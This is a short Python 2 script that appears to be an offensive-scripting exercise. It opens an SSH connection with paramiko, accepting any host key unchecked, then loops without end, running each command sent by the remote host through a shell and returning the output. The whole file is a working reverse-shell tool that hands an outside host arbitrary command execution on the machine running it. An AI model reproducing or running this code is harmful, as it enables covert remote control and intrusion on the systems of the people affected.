#!/usr/bin/python
"""

@author : 'Muhammad Arslan <rslnrkmt2552@gmail.com>'

"""
#TODO add a graceful exit
import paramiko
import subprocess

host = raw_input("[*] Enter IP > ").strip()
user = raw_input("[*] Enter username > ").strip()
passwd = raw_input("[*] Enter password > ").strip()
com = raw_input("[*] Enter command > ").strip()

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024)
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command(host, user, passwd, com)
